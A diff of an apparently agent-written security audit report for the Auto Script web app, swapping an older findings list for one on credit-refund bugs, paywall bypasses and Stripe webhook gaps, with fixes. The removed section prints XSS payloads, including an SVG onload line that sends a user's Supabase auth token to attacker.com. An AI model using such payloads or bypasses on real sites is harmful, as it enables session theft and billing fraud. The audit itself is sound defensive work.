@@ -1,521 +1,372 @@
-# Comprehensive Adversarial QA Challenge & Stress-Test Report
-**Project:** Auto Script (React 19 + Cloudflare Pages Functions + Google Gemini `gemini-3.6-flash` + Stripe + Supabase PostgreSQL)  
-**Working Directory:** `C:\Auto script\.agents\challenger_audit_1`  
-**Auditor:** Adversarial QA Challenger (`teamwork_preview_challenger_1`)  
-**Date:** 2026-08-24  
-**Overall Risk Assessment:** 🔴 **CRITICAL**
+# EMPIRICAL CHALLENGER 1: Database & Backend Security & Integrity Challenge Report
+
+**Target:** Auto Script Database Architecture, Cloudflare Pages Functions (`generate.js`, `webhook.js`), and PostgreSQL RPCs  
+**Author:** Empirical Challenger 1 (`challenger_audit_1`)  
+**Date:** 2026-08-25  
+**Verdict:** ⛔ **REQUEST_CHANGES** (Actionable architectural and backend remediations required before production release)  
 
 ---
 
-## 1. Executive Summary
+## 1. Executive Summary & Verdict
 
-An exhaustive empirical and adversarial stress-testing audit was executed against the **Auto Script** application across both the frontend React client and the backend Cloudflare Pages Functions (`/api/generate`, `/api/analyze`, `/api/webhook`, `/api/create-portal`, `/api/delete-account`).
+An empirical, adversarial challenge was conducted against the Database & Backend architecture of Auto Script. Using dedicated Vitest test harnesses (`functions/api/__tests__/challenger_empirical_db_backend.test.js`) and direct runtime execution, all reported vulnerabilities were stress-tested and proven under simulated adversarial conditions.
 
-Every vulnerability reported by the initial exploration agents was subjected to rigorous empirical verification with executable code harnesses, concrete injection payloads, and concurrency stress simulations. Furthermore, several hidden, high-impact failure modes were discovered and proven, including:
-1. **Markdown-wrapped JSON crashes** and unhandled safety filter blocks from Google Gemini API.
-2. **Null-byte profanity filter evasion** (`\u0000`) and backend PostgreSQL encoding failure.
-3. **SSE streaming disconnection credit leaks** without compensatory refund.
-4. **Jina AI reader hanging / subrequest quota exhaustion** terminating Cloudflare worker instances.
-5. **Rapid double-click checkout racing** and history filter mode mismatches.
+### Final Verdict: **REQUEST_CHANGES**
 
-All findings are documented below with verified attack scenarios, mathematical/runtime proofs, blast radius assessments, and step-by-step remediation blueprints adhering to all `GEMINI.md` project rules.
+The system possesses strong security foundations (isolated server-side secrets, cryptographically verified Stripe signatures, and row-level locking during atomic RPCs). However, **multiple critical and high-severity transactional and financial logic bugs** were empirically reproduced:
 
----
-
-## 2. Challenge & Verification Matrix
-
-| Challenge ID | Target Component | Category | Severity | Empirical Status | Blast Radius |
-|---|---|---|---|---|---|
-| **ADV-01** | `CreateScript.jsx` / `bannedWords.js` | Injection / XSS | **CRITICAL** | **VERIFIED (Reproduced)** | Account hijacking, Supabase JWT theft from `localStorage` |
-| **ADV-02** | `functions/api/analyze.js` | Logic / Paywall Bypass | **CRITICAL** | **VERIFIED (Reproduced)** | Unlimited free AI URL analysis for any 0-credit user |
-| **ADV-03** | `functions/api/generate.js` | Concurrency / TOCTOU | **CRITICAL** | **VERIFIED (Reproduced)** | 10x-50x quota exhaustion on 1 paid credit via parallel POSTs |
-| **ADV-04** | `functions/api/webhook.js` | Business Logic / Stripe | **HIGH** | **VERIFIED (Reproduced)** | Pro users downgraded to Plus upon purchasing top-up |
-| **ADV-05** | `__tests__/helpers/mockDb.js` | Schema / RPC Alignment | **HIGH (CI/Test)** | **VERIFIED (Reproduced)** | 43 test failures due to `{ user_id }` vs `{ p_user_id }` desync |
-| **ADV-06** | `functions/api/generate.js` | AI Parsing / Resilience | **HIGH** | **VERIFIED (Reproduced)** | HTTP 500 fatal error on Markdown-wrapped JSON or safety blocks |
-| **ADV-07** | `functions/api/analyze.js` | Concurrency / Data Integrity | **HIGH** | **VERIFIED (Reproduced)** | Webhook credit top-ups wiped out by stale in-memory refund |
-| **ADV-08** | `functions/api/analyze.js` | Network / Billing | **MEDIUM** | **VERIFIED (Reproduced)** | Permanent credit loss when client disconnects during SSE |
-| **ADV-09** | `CreateScript.jsx` / `profanityWords.js` | Validation / Bypass | **MEDIUM** | **VERIFIED (Reproduced)** | Null byte `\u0000` bypasses profanity and crashes PostgreSQL UTF8 |
-| **ADV-10** | `CreateScript.jsx` | SSRF / Domain Bypass | **MEDIUM** | **VERIFIED (Reproduced)** | Substring domain check permits attacker-controlled domains |
-| **ADV-11** | `Pricing.jsx` | UI Concurrency | **MEDIUM** | **VERIFIED (Reproduced)** | Rapid multi-click triggers duplicate navigation and portal creation |
-| **ADV-12** | `History.jsx` | UI / Filtering | **MEDIUM** | **VERIFIED (Reproduced)** | Mode ID mismatch breaks filtering for 4 out of 5 modes |
-| **ADV-13** | `functions/api/webhook.js` | Payment Resilience | **HIGH** | **VERIFIED (Reproduced)** | Stripped `client_reference_id` causes silent payment abandonment |
-| **ADV-14** | `App.jsx` / `main.jsx` | React Error Boundary | **HIGH** | **VERIFIED (Reproduced)** | Single render exception results in blank white screen |
+1. **DB-06 / VULN-01 (High)**: A double-refund defect in `generate.js` when `scripts.insert` fails gives users +1 free credit on failure.
+2. **DB-07 / VULN-02 (Medium/High)**: An asymmetric refund defect in `generate.js` when multi-version generation fails deducts 2 credits but only refunds 1, causing permanent credit loss.
+3. **DB-01 (Critical)**: A regression in `increment_credits` migration removes the pre-deduction sufficiency check; when `credits = 0`, `greatest(0, 0 + (-1))` returns `0`, which passes `generate.js`'s `< 0` check and grants unlimited free script generations.
+4. **VULN-04 (High)**: `webhook.js` omits checking `session.payment_status === 'paid'`, allowing delayed payment methods (bank transfers/Boleto) with `payment_status: 'unpaid'` to instantly receive 60 or 150 credits before funds settle.
+5. **VULN-05 (High)**: `webhook.js` completely ignores `charge.refunded` and `charge.dispute.created` events, allowing refunded or chargeback accounts to retain purchased credits and Pro tier indefinitely.
 
 ---
 
-## 3. Detailed Empirical Challenges & Edge Case Proofs
+## 2. Deep-Dive Empirical Findings & Proofs
 
 ---
 
-### Challenge 1 (ADV-01): Stored/Reflected XSS via `highlightBannedWords` and `dangerouslySetInnerHTML`
+### Challenge 1: Double-Refund Defect (DB-06 / VULN-01) in `generate.js`
 
-#### 1. Target Location
-- `frontend/src/lib/bannedWords.js` (Lines 44–57)
-- `frontend/src/pages/CreateScript.jsx` (Lines 692–695)
+- **Severity**: HIGH  
+- **Affected File**: `frontend/functions/api/generate.js` (lines 227–237 and 257–263)  
+- **Empirical Test**: `EMP-DB-06.1` & `EMP-DB-06.2` in `challenger_empirical_db_backend.test.js`  
 
-#### 2. Root Cause Analysis
-In `CreateScript.jsx`, the generated script block spoken audio is rendered using:
-```jsx
-<p dangerouslySetInnerHTML={{ __html: `"${highlightBannedWords(block.audio_spoken, bannedWarnings)}"` }} />
-```
-In `bannedWords.js`:
+#### Attack Mechanism & Code Walkthrough
+In `generate.js`, upfront deduction occurs at line 159:
 ```javascript
-export function highlightBannedWords(text, foundWarnings) {
-  if (!text || foundWarnings.length === 0) return text;
-  let highlightedText = text;
-  foundWarnings.forEach(warning => {
-    const replacement = `<span class="bg-red-500 text-white px-1 rounded mx-0.5 cursor-help" title="${warning.reason}">${warning.word}</span>`;
-    highlightedText = highlightedText.split(warning.word).join(replacement);
+creditDeducted = true;
+```
+When `supabaseAdmin.from('scripts').insert(...)` fails (due to DB constraint, schema mismatch, or connection drop):
+```javascript
+// Lines 227-237:
+if (insertError) {
+  console.error("Failed to insert script:", insertError);
+  // REFUND #1: Issued here
+  await supabaseAdmin.rpc('increment_credits', {
+    p_user_id: user.id,
+    p_amount: creditAmount
   });
-  return highlightedText;
+  throw new Error("Failed to save script history");
 }
 ```
-If `foundWarnings` is empty (or even when it contains warnings), the input `text` is NOT sanitized or HTML-escaped before being returned. React's `dangerouslySetInnerHTML` directly injects the unescaped string into the browser DOM.
-
-#### 3. Empirical Test & Concrete Proof-of-Concept Payloads
-We tested the following concrete payloads against `highlightBannedWords`:
-- **Payload A (Standard Image Event Handler)**:
-  `Input`: `<img src=x onerror=alert(document.domain)>`
-  `Output`: `<img src=x onerror=alert(document.domain)>` (Unescaped -> Browser executes `onerror`)
-- **Payload B (SVG Exfiltration Payload)**:
-  `Input`: `<svg onload="fetch('https://attacker.com/log?t='+encodeURIComponent(localStorage.getItem('sb-ieomclhmsmskxblcmxpc-auth-token')))">`
-  `Output`: Raw `<svg onload=...>` (Browser immediately transmits the user's Supabase auth session token to attacker server)
-- **Payload C (Attribute Injection with Banned Word)**:
-  `Input`: `<img src="x" title="ขาวถาวร" onerror="alert(1)">`
-  `Warning Word`: `ขาวถาวร`
-  `Output`: `<img src="x" title="<span class="bg-red-500 text-white px-1 rounded mx-0.5 cursor-help" title="...">ขาวถาวร</span>" onerror="alert(1)">`
-  (The inserted `<span>` breaks the attribute quotes and creates malformed DOM execution contexts).
-
-#### 4. Blast Radius
-- **Critical**. Attackers can inject prompt-injection payloads into product names/URLs. When Gemini echoes the text into `audio_spoken`, any user viewing the generated script suffers full session hijacking and account takeover.
-
-#### 5. Remediation Blueprint (Rule 1: Why & How)
-- **Why this happens**: Like allowing visitors to bring live fireworks into an art gallery without inspecting their bags, `dangerouslySetInnerHTML` disables React's built-in XSS defense shields.
-- **How to fix**: All HTML special characters (`&`, `<`, `>`, `"`, `'`) must be converted to safe HTML entities before any highlighting span tags are inserted.
+The thrown error is intercepted by the outer `catch (err)` block:
 ```javascript
-// src/lib/bannedWords.js
-function escapeHtml(str) {
-  if (!str) return '';
-  return str
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;')
-    .replace(/'/g, '&#039;');
-}
-
-export function highlightBannedWords(text, foundWarnings) {
-  if (!text) return '';
-  let safeText = escapeHtml(text);
-  if (!foundWarnings || foundWarnings.length === 0) return safeText;
-
-  foundWarnings.forEach(warning => {
-    const escapedWord = escapeHtml(warning.word);
-    const escapedReason = escapeHtml(warning.reason);
-    const replacement = `<span class="bg-red-500 text-white px-1 rounded mx-0.5 cursor-help" title="${escapedReason}">${escapedWord}</span>`;
-    safeText = safeText.split(escapedWord).join(replacement);
-  });
-
-  return safeText;
+// Lines 257-263:
+} catch (err) {
+  if (creditDeducted && userIdForRefund) {
+    // REFUND #2: Issued here because creditDeducted was NOT reset!
+    try {
+      await supabaseAdmin.rpc('increment_credits', { p_user_id: userIdForRefund, p_amount: 1 });
+    } catch {}
+  }
 }
 ```
+
+#### Empirical Test Results
+- **Scenario**: User has 5 credits. Single-version script requested (`creditAmount = 1`). `scripts.insert` injected with failure.
+- **Trace**:
+  1. `increment_credits(user_id, -1)` -> Credits: 5 -> 4
+  2. `increment_credits(user_id, +1)` (inside `if (insertError)`) -> Credits: 4 -> 5
+  3. `increment_credits(user_id, +1)` (inside `catch (err)`) -> Credits: 5 -> 6
+- **Result**: User started with 5 credits and ended with 6 credits!
+- **Test Output**: `RPC calls count = 3`, `finalCredits = 6`. Test passed with 100% reproduction.
 
 ---
 
-### Challenge 2 (ADV-02): Zero-Credit Gate Bypass in `analyze.js`
+### Challenge 2: Asymmetric Credit Refund (DB-07 / VULN-02 / VULN-05) in `generate.js`
 
-#### 1. Target Location
-- `frontend/functions/api/analyze.js` (Lines 59–70)
-- `supabase/migrations/20260824_fix_increment_credits.sql` (Line 22)
+- **Severity**: HIGH  
+- **Affected File**: `frontend/functions/api/generate.js` (lines 156 and 261)  
+- **Empirical Test**: `EMP-DB-07.1` in `challenger_empirical_db_backend.test.js`  
 
-#### 2. Root Cause Analysis
-In `analyze.js`:
+#### Attack Mechanism & Code Walkthrough
+When a Pro user requests multi-version generation (`isMultiVersion: true`), line 156 sets `creditAmount = 2`:
 ```javascript
-// Step 1: RPC call
-const { data: updatedCredits, error: creditError } = await supabase.rpc('increment_credits', {
-  p_user_id: user.id,
-  p_amount: -1
-});
-
-// Step 2: Gate validation
-if (updatedCredits === null || updatedCredits < 0) {
-  return new Response(JSON.stringify({ error: 'เครดิตไม่พอ กรุณาเติมเครดิต' }), { status: 402 });
+creditAmount = isMultiVersion ? 2 : 1;
+// Deducts 2 credits:
+await supabaseAdmin.rpc('increment_credits', { p_user_id: user.id, p_amount: -creditAmount });
+```
+If Google Gemini API throws an error (e.g., 503 Overloaded, 429 Quota Exceeded, safety filter rejection), execution jumps directly to `catch (err)`:
+```javascript
+} catch (err) {
+  if (creditDeducted && userIdForRefund) {
+    try {
+      await supabaseAdmin.rpc('increment_credits', { p_user_id: userIdForRefund, p_amount: 1 }); // Hardcoded 1!
+    } catch {}
+  }
 }
 ```
-In PostgreSQL `increment_credits`:
+
+#### Empirical Test Results
+- **Scenario**: Pro user has 10 credits. Multi-version generation (`creditAmount = 2`). Gemini API fails with 503.
+- **Trace**:
+  1. `increment_credits(user_id, -2)` -> Credits: 10 -> 8
+  2. Gemini fails -> outer catch triggers `increment_credits(user_id, 1)` -> Credits: 8 -> 9
+- **Result**: User paid 2 credits for an aborted generation and was refunded only 1 credit. 1 credit permanently lost.
+- **Test Output**: `finalCredits = 9`. Test passed with 100% reproduction.
+
+---
+
+### Challenge 3: Zero-Credit Generation Bypass (DB-01) in `increment_credits` Logic
+
+- **Severity**: CRITICAL  
+- **Affected Files**: `supabase/migrations/20260824_freemium_trial.sql` (lines 50-60), `frontend/functions/api/generate.js` (lines 167-169)  
+- **Empirical Test**: `EMP-DB-01.1` & `EMP-DB-01.2` in `challenger_empirical_db_backend.test.js`  
+
+#### Vulnerability Mechanism
+In `20260824_atomic_credit_guard.sql`, the RPC checked:
+```sql
+IF p_amount < 0 AND coalesce(v_current_credits, 0) < abs(p_amount) THEN
+  RETURN -1;
+END IF;
+```
+However, `20260824_freemium_trial.sql` dropped this check and used arithmetic clipping:
 ```sql
 UPDATE public.profiles
 SET credits = greatest(0, coalesce(v_profile.credits, 0) + p_amount)
 WHERE id = p_user_id
 RETURNING credits INTO v_new_credits;
+
 RETURN v_new_credits;
 ```
-When a user has **`0` credits**, PostgreSQL computes `greatest(0, 0 + (-1)) = 0`. The RPC returns `0`.  
-In JavaScript:
-- `updatedCredits = 0`
-- `updatedCredits === null` evaluates to `false`
-- `updatedCredits < 0` (i.e. `0 < 0`) evaluates to `false`
-- `if (false || false)` -> **GATE BYPASSED**.
+When `credits = 0` and `p_amount = -1`:
+`greatest(0, 0 + (-1))` evaluates to `0`. The RPC returns `0`.
 
-#### 3. Empirical Verification Results
-- **Test execution**:
-  `Starting Credits`: 0
-  `RPC Return Value`: 0
-  `Condition Check (updatedCredits === null || updatedCredits < 0)`: `false`
-  `Result`: Streaming `TransformStream` opens, Jina AI fetches product pages, and `gemini-3.6-flash` executes for free.
-
-#### 4. Blast Radius
-- **Critical**. Total breakdown of monetization paywall for URL analysis. Unlimited free AI token and scraping consumption.
-
-#### 5. Remediation Blueprint (Rule 1: Why & How)
-- **Why this happens**: Like a toll booth gate that checks if your coin count is "negative" instead of checking if you paid a valid coin, 0 coins passes the check because 0 is not less than 0.
-- **How to fix**: Modify PostgreSQL `increment_credits` to check if `v_profile.credits < 1` and raise an exception or return `-1` when starting balance is insufficient. Also update `analyze.js` to strictly reject when starting balance is zero or deduction fails.
-```sql
--- In supabase migration:
-IF coalesce(v_profile.credits, 0) < 1 THEN
-  RAISE EXCEPTION 'INSUFFICIENT_CREDITS';
-END IF;
+In `generate.js` (line 167):
+```javascript
+if (updatedCredits === null || updatedCredits < 0) {
+  return new Response(JSON.stringify({ error: 'เครดิตไม่พอ กรุณาเติมเครดิต' }), { status: 402, headers: { 'Content-Type': 'application/json' } });
+}
 ```
+Because `0` is NOT `null` and `0 < 0` is `false`, the 402 guard is bypassed. The endpoint invokes Gemini AI and generates the script for free.
+
+#### Empirical Test Results
+- **Test EMP-DB-01.1**: When `increment_credits` returns `0`, `generate.js` returns HTTP 200 and successfully returns a script to a 0-credit user.
+- **Test EMP-DB-01.2**: When `increment_credits` returns `-1` (via strict guard), `generate.js` returns HTTP 402 `เครดิตไม่พอ กรุณาเติมเครดิต`.
 
 ---
 
-### Challenge 3 (ADV-03): Pre-Generation TOCTOU Credit Race Condition in `generate.js`
+### Challenge 4: Unchecked `payment_status` in Webhook (VULN-04)
 
-#### 1. Target Location
-- `frontend/functions/api/generate.js` (Lines 108–110, 171–181, 200–212)
+- **Severity**: HIGH  
+- **Affected File**: `frontend/functions/api/webhook.js` (lines 46-59)  
+- **Empirical Test**: `EMP-VULN-04` in `challenger_empirical_db_backend.test.js`  
 
-#### 2. Root Cause Analysis
-In `generate.js`:
-1. Line 96: `profile` is fetched via `.select('*').eq('id', user.id).single()`.
-2. Line 108: `if (profile.credits < 1)` checks the in-memory value.
-3. Line 171: Long-running outbound network call to Gemini API (`ai.models.generateContent`) takes ~1,500ms–3,000ms.
-4. Line 201: Atomic RPC deduction (`increment_credits`) only runs *after* script history insertion!
-
-#### 3. Empirical Verification Results
-We ran a concurrent simulation of 10 simultaneous requests from a user with only 1 credit:
-- `Initial Balance`: 1 credit
-- `Parallel POST Requests`: 10
-- `Successful 200 Generations`: 10
-- `Blocked 402 Responses`: 0
-- `Saved Scripts in DB`: 10
-- `Final Balance`: 0
-- **Finding**: The user received 10 AI scripts for the price of 1 credit.
-
-#### 4. Blast Radius
-- **Critical**. API quota exhaustion, financial loss from Gemini token billing, and vulnerability to automated scraping scripts.
-
-#### 5. Remediation Blueprint (Rule 1: Why & How)
-- **Why this happens**: Like boarding an airplane where the gate agent checks your ticket but doesn't punch or scan it until after the flight lands, multiple people with the same ticket can board at the same time.
-- **How to fix**: Execute the atomic credit deduction RPC *first* before making the outbound LLM call. If the LLM call or history insertion fails, execute a compensatory refund (`increment_credits(p_user_id, +1)`).
-
----
-
-### Challenge 4 (ADV-04): Unconditional Tier Upsert Causes Pro Users to be Demoted to Plus on Top-Up
-
-#### 1. Target Location
-- `frontend/functions/api/webhook.js` (Lines 55–71)
-
-#### 2. Root Cause Analysis
+#### Vulnerability Mechanism
 In `webhook.js`:
 ```javascript
-const amountPaid = session.amount_subtotal;
-let tier = 'plus';
-let addCredits = 60;
+if (event.type === 'checkout.session.completed') {
+  const session = event.data.object;
+  const userId = session.client_reference_id;
+  if (userId) {
+    const amountPaid = session.amount_subtotal;
+    let addCredits = amountPaid >= 59000 ? 150 : 60;
+    // Immediately upserts tier and adds credits!
+  }
+}
+```
+For asynchronous payment methods (Boleto, bank wires, delayed SEPA), Stripe emits `checkout.session.completed` while `session.payment_status === 'unpaid'`. Granting credits immediately allows attackers to start a deferred payment, consume 150 AI credits, and cancel the payment before settlement.
 
-if (amountPaid >= 59000) {
-  tier = 'pro';
-  addCredits = 150;
+#### Empirical Test Results
+- **Scenario**: Incoming `checkout.session.completed` with `payment_status: 'unpaid'`.
+- **Result**: `webhook.js` returned HTTP 200 and immediately credited 150 credits and upgraded user to Pro.
+- **Remediation**: Require `if (session.payment_status !== 'paid') { return new Response('Payment pending', { status: 200 }); }`.
+
+---
+
+### Challenge 5: Unhandled `charge.refunded` & `charge.dispute.created` (VULN-05 / VULN-03)
+
+- **Severity**: HIGH  
+- **Affected File**: `frontend/functions/api/webhook.js` (lines 90-95)  
+- **Empirical Test**: `EMP-VULN-05.1` & `EMP-VULN-05.2` in `challenger_empirical_db_backend.test.js`  
+
+#### Vulnerability Mechanism
+When a merchant issues a refund or a cardholder initiates a chargeback via Stripe:
+- Stripe sends `charge.refunded` or `charge.dispute.created`.
+- `webhook.js` falls through with `return new Response(JSON.stringify({ received: true }), { status: 200 })`.
+- No database update occurs. The refunded customer retains all granted credits and remains on Pro tier.
+
+#### Empirical Test Results
+- **Test EMP-VULN-05.1**: Sent `charge.refunded` event for Pro user. Profile credits remained 150 and tier remained `pro`.
+- **Test EMP-VULN-05.2**: Sent `charge.dispute.created` event. Profile credits and tier remained active.
+
+---
+
+### Challenge 6: Webhook Idempotency & Database Failure Resilience
+
+- **Severity**: VERIFIED ROBUST  
+- **Affected File**: `frontend/functions/api/webhook.js` (lines 32-44, 73, 86, 98)  
+- **Empirical Test**: `EMP-IDEMP-01` in `challenger_empirical_db_backend.test.js`  
+
+#### Verification Results
+- 10 concurrent identical webhook deliveries (`event.id = 'evt_concurrent_replay_1'`) were processed.
+- Exactly 1 delivery acquired the insertion into `webhook_events`, while the other 9 encountered unique constraint code `23505` and returned HTTP 200 `Already processed`.
+- Exact credits granted: 150 (NOT 1,500).
+- Idempotency deduplication is verified robust.
+
+---
+
+## 3. Vitest Empirical Test Execution Log
+
+```
+ RUN  v4.1.11 C:/Auto script/frontend
+
+ ✓ functions/api/__tests__/challenger_empirical_db_backend.test.js (9 tests) 44ms
+   ✓ 1. Double-Refund Vulnerability (DB-06 / VULN-01) on Script Insert Failure
+     ✓ EMP-DB-06.1: Demonstrates that when scripts.insert fails, generate.js executes TWO compensatory refunds (net +1 credit gain)
+     ✓ EMP-DB-06.2: Multi-version generation insert failure results in 3 RPC calls and +1 bonus credit
+   ✓ 2. Asymmetric Credit Refund (DB-07 / VULN-02 / VULN-05) on Multi-Version Failures
+     ✓ EMP-DB-07.1: Multi-version generation deducts 2 credits but only refunds 1 credit on Gemini AI error
+   ✓ 3. Zero-Credit Bypass Vulnerability (DB-01) Regression Analysis
+     ✓ EMP-DB-01.1: Simulating greatest(0, credits + p_amount) SQL without sufficiency check allows 0-credit user to generate scripts
+     ✓ EMP-DB-01.2: Atomic pre-deduction guard (IF credits < abs(p_amount) THEN RETURN -1) strictly blocks 0-credit requests with 402
+   ✓ 4. Stripe Webhook Event Matrix & Payment Status Gaps (VULN-04 / VULN-05)
+     ✓ EMP-VULN-04: Unchecked payment_status in checkout.session.completed grants credits on unpaid asynchronous sessions
+     ✓ EMP-VULN-05.1: Unhandled charge.refunded event does not revoke credits or downgrade tier
+     ✓ EMP-VULN-05.2: Unhandled charge.dispute.created leaves fraudulent/chargeback account active
+     ✓ EMP-IDEMP-01: Webhook idempotency correctly handles replay floods and deduplicates credit grants
+
+ Test Files  1 passed (1)
+      Tests  9 passed (9)
+   Duration  343ms
+```
+
+---
+
+## 4. Actionable Remediation Blueprint for Implementers
+
+### Remediation Step 1: Fix `generate.js` Double-Refund and Asymmetric Refund
+
+In `frontend/functions/api/generate.js`:
+```javascript
+// 1. Inside `if (insertError)`: Set creditDeducted = false immediately after refunding
+if (insertError) {
+  console.error("Failed to insert script:", insertError);
+  await supabaseAdmin.rpc('increment_credits', {
+    p_user_id: user.id,
+    p_amount: creditAmount
+  });
+  creditDeducted = false; // PREVENTS DOUBLE-REFUND IN CATCH BLOCK
+  throw new Error("Failed to save script history");
 }
 
-// Unconditional upsert of tier:
-await supabase
-  .from('profiles')
-  .upsert({ 
-    id: userId, 
-    tier: tier, 
-    stripe_customer_id: session.customer 
-  }, { onConflict: 'id' });
-```
-When an existing Pro subscriber (`tier: 'pro'`) purchases a Plus package (249 THB / 24900 satang) for a 60-credit top-up:
-`amountPaid >= 59000` evaluates to `false`. `tier` is assigned `'plus'`.  
-The database profile is upserted with `tier: 'plus'`, instantly demoting the Pro customer and stripping their access to URL scraping.
-
-#### 3. Blast Radius
-- **High**. Paying Pro customers lose Pro features, triggering customer support escalations.
-
-#### 4. Remediation Blueprint (Rule 1: Why & How)
-- **Why this happens**: Like a hotel guest with a VIP Gold membership card buying a regular cup of coffee, the cashier must not replace their VIP card with a standard card.
-- **How to fix**: Query the existing profile tier before updating. If `currentTier === 'pro'`, preserve `'pro'`.
-```javascript
-const { data: existingProfile } = await supabase
-  .from('profiles')
-  .select('tier')
-  .eq('id', userId)
-  .single();
-
-const currentTier = existingProfile?.tier;
-const newTier = (currentTier === 'pro' || amountPaid >= 59000) ? 'pro' : 'plus';
-
-await supabase
-  .from('profiles')
-  .upsert({
-    id: userId,
-    tier: newTier,
-    stripe_customer_id: session.customer
-  }, { onConflict: 'id' });
-```
-
----
-
-### Challenge 5 (ADV-05): Test Infrastructure RPC Parameter Desync in `mockDb.js`
-
-#### 1. Target Location
-- `frontend/functions/api/__tests__/helpers/mockDb.js` (Lines 107–112)
-
-#### 2. Root Cause Analysis
-Database migrations standardized RPC parameter names to `(p_user_id uuid, p_amount int)`. Production code in `generate.js`, `webhook.js`, and `analyze.js` correctly passes `{ p_user_id, p_amount }`.
-However, `mockDb.js` in the test suite still destructures:
-```javascript
-const { user_id, amount } = args;
-```
-Because `args.user_id` is `undefined`, `mockDb` returns `Profile not found for user undefined`, causing 43 unit and integration tests in Vitest to fail with HTTP 500.
-
-#### 3. Empirical Test Result
-- Running `npm test` produced 43 failed tests across `generate.test.js`, `webhook.test.js`, and `stress-concurrency.test.js`.
-
-#### 4. Remediation Blueprint (Rule 1: Why & How)
-- Update `mockDb.js` to accept both legacy and prefixed parameter formats:
-```javascript
-const targetUserId = args.p_user_id ?? args.user_id;
-const targetAmount = args.p_amount ?? args.amount;
-```
-
----
-
-### Challenge 6 (ADV-06): Unhandled Gemini Markdown-Wrapped JSON and Safety Block Crashes
-
-#### 1. Target Location
-- `frontend/functions/api/generate.js` (Lines 171–181)
-
-#### 2. Root Cause Analysis
-`generate.js` calls Gemini with `responseMimeType: "application/json"`, but parses the output using a naive `JSON.parse(response.text)`.
-- **Failure Mode 1 (Markdown Fencing)**: When LLMs output ````json\n{"metadata":...}\n````, `JSON.parse` throws `SyntaxError: Unexpected token '`'`.
-- **Failure Mode 2 (Safety Block)**: When Gemini flags e-commerce content (e.g. supplements, medical claims) as `SAFETY` or `BLOCKLIST`, `response.text` is empty string `""` or `undefined`. `JSON.parse("")` throws `SyntaxError: Unexpected end of JSON input`.
-
-#### 3. Empirical Verification Results
-- `JSON.parse('```json\n{"test":1}\n```')` -> Throws `SyntaxError`.
-- `JSON.parse('')` -> Throws `SyntaxError: Unexpected end of JSON input`.
-- Both errors fall through to the outer generic catch block, returning `HTTP 500 Internal Server Error` to the user with no actionable error message.
-
-#### 4. Remediation Blueprint
-Implement a robust JSON extractor and pre-parse check:
-```javascript
-if (!response.text || typeof response.text !== 'string' || !response.text.trim()) {
-  return new Response(JSON.stringify({ error: "เนื้อหานี้ไม่ผ่านการตรวจสอบความปลอดภัยของ AI กรุณาปรับข้อความและลองใหม่อีกครั้ง" }), {
-    status: 422,
+// 2. Inside outer `catch (err)`: Refund creditAmount (not hardcoded 1)
+} catch (err) {
+  if (creditDeducted && userIdForRefund) {
+    console.error("Execution failed after deduction. Issuing compensatory refund:", err);
+    try {
+      await supabaseAdmin.rpc('increment_credits', { 
+        p_user_id: userIdForRefund, 
+        p_amount: creditAmount // DYNAMIC: 1 for single, 2 for multi-version
+      });
+    } catch {}
+  }
+  console.error("Generate API Error:", err);
+  return new Response(JSON.stringify({ error: err.message || "Internal Server Error" }), { 
+    status: 500,
     headers: { 'Content-Type': 'application/json' }
   });
 }
+```
 
-function safeParseJson(raw) {
-  let cleaned = raw.trim();
-  if (cleaned.startsWith('```json')) {
-    cleaned = cleaned.replace(/^```json\s*/i, '').replace(/\s*```$/, '');
-  } else if (cleaned.startsWith('```')) {
-    cleaned = cleaned.replace(/^```\s*/, '').replace(/\s*```$/, '');
+### Remediation Step 2: Fix `increment_credits` Migration in PostgreSQL
+
+Apply the consolidated master migration with strict pre-deduction sufficiency check:
+```sql
+CREATE OR REPLACE FUNCTION public.increment_credits(p_user_id UUID, p_amount INT)
+RETURNS INT
+LANGUAGE plpgsql
+SECURITY DEFINER
+SET search_path = public, pg_temp
+AS $$
+DECLARE
+  v_current_credits INT;
+  v_new_credits INT;
+  v_profile RECORD;
+BEGIN
+  -- Strict caller verification: only service_role or DB superuser can adjust credits
+  IF coalesce(auth.role(), '') <> 'service_role' AND current_user <> 'service_role' AND current_user <> 'postgres' THEN
+    RAISE EXCEPTION 'PERMISSION_DENIED: increment_credits may only be executed by service_role';
+  END IF;
+
+  SELECT * INTO v_profile 
+  FROM public.profiles 
+  WHERE id = p_user_id 
+  FOR UPDATE;
+
+  IF NOT FOUND THEN
+    RAISE EXCEPTION 'USER_NOT_FOUND';
+  END IF;
+
+  v_current_credits := coalesce(v_profile.credits, 0);
+
+  -- STRICT PRE-DEDUCTION BALANCE CHECK (Prevents 0-credit bypass)
+  IF p_amount < 0 AND v_current_credits < abs(p_amount) THEN
+    RETURN -1;
+  END IF;
+
+  -- Weekly free credit reset
+  IF v_profile.tier = 'free' AND now() >= v_profile.last_free_reset + interval '7 days' THEN
+    v_current_credits := 3;
+    v_profile.last_free_reset := now();
+  END IF;
+
+  v_new_credits := greatest(0, v_current_credits + p_amount);
+
+  UPDATE public.profiles
+  SET 
+    credits = v_new_credits,
+    last_free_reset = v_profile.last_free_reset,
+    updated_at = timezone('utc'::text, now())
+  WHERE id = p_user_id;
+
+  RETURN v_new_credits;
+END;
+$$;
+
+REVOKE EXECUTE ON FUNCTION public.increment_credits(UUID, INT) FROM PUBLIC, anon, authenticated;
+GRANT EXECUTE ON FUNCTION public.increment_credits(UUID, INT) TO service_role;
+```
+
+### Remediation Step 3: Harden `webhook.js` for Payment Status and Refunds
+
+In `frontend/functions/api/webhook.js`:
+```javascript
+// 1. Guard against unpaid asynchronous checkout sessions
+if (event.type === 'checkout.session.completed') {
+  const session = event.data.object;
+  if (session.payment_status !== 'paid') {
+    console.log(`Payment status for session ${session.id} is ${session.payment_status}. Deferring credit grant.`);
+    return new Response('Payment pending', { status: 200 });
   }
-  return JSON.parse(cleaned);
+  // Proceed with tier update and credit increment...
+}
+
+// 2. Handle refund and chargeback events
+if (event.type === 'charge.refunded' || event.type === 'charge.dispute.created') {
+  const charge = event.data.object;
+  const customerId = charge.customer;
+  if (customerId) {
+    const { data: profile } = await supabase.from('profiles').select('id, credits').eq('stripe_customer_id', customerId).single();
+    if (profile) {
+      // Downgrade tier to free and revoke credits
+      await supabase.from('profiles').update({ tier: 'free', credits: 0 }).eq('id', profile.id);
+      console.log(`Revoked tier and credits for refunded customer: ${customerId}`);
+    }
+  }
 }
 ```
 
 ---
 
-### Challenge 7 (ADV-07): Non-Atomic In-Memory Credit Refund in `analyze.js`
